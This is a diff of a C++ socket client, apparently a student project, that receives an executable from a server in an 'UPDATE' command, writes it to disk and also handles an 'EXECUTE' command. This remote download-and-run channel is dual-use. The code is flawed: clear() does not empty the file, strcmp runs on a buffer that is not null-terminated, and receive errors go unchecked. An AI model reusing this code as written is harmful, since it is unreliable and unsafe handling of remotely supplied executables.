@@ -19,26 +19,27 @@ using namespace std;
 std::ofstream openFile(char *file_path)
 {
 	std::ofstream f2(file_path, std::fstream::binary);
+
+	// empty the file
+	f2.clear();
+
 	return f2;
 }
 
-void create_file(SocketManager socketManager, SOCKET socket, char* recBuf, int iResult)
+void create_file(SocketManager socketManager, SOCKET socket)
 {
-	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
+	char * filePath = "Update\\client_update_file.exe";
+
 	std::ofstream clientFile = openFile(filePath);
-	int iResult2;
+	int result;
 	char recvbuf[DEFAULT_BUFLEN * 4];
 
 	do
 	{
-		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
-		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-		iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-		iResult2 = socketManager.send_data(socket, "ok");
+		result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
 		if ((strcmp(recvbuf, "END_UPDATE") != 0))
 		{
-			clientFile.write(recvbuf, iResult);
-			printf("Bytes received: %d\n", iResult);
+			clientFile.write(recvbuf, result);
 		}
 
 	} while (strcmp(recvbuf, "END_UPDATE") != 0);
@@ -406,7 +407,7 @@ int main(int argc, char **argv)
 
 					if (!strcmp(recvbuf, "UPDATE"))
 					{
-						create_file(socketManager, socket, recvbuf, iResult);
+						create_file(socketManager, socket);
 					}
 					else if (!strcmp(recvbuf, "EXECUTE"))
 					{
